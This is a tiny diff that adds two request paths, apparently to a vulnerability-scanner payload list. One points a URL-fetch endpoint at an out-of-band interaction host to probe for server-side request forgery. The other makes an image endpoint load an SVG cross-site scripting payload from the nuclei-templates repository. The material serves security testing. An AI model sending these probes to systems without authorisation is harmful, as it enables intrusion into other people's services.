@@ -1,0 +1,2 @@
+/o/get/httpmeta?url=https://{{interactsh-url}}
+/o/get/image?url=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg
